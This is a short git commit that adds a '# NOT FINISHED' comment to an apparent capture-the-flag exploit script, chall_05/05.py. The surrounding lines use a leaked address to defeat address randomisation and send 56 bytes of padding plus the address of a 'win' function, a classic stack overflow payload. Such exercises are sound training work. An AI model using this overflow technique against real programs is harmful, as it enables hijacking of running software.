18f1ac992e0a6b13cae4099df0b801afa94c371d
ajarmusch <61516473+ajarmusch@users.noreply.github.com>
2022-05-05 20:14:37 -0400

    # NOT FINISHED

--- chall_05/05.py
+++ chall_05/05.py
@@ -6,6 +6,7 @@ leak = int(leak,16)
 binary.address = leak - binary.sym.main
 p.sendline(56*b'A' + p64(binary.sym.win) + b'')
 
+# NOT FINISHED
 
 #To find the win address you need to use the leak address and go to the front of the ship (it was your analogy)
 #once you have the address you can move to the win address 
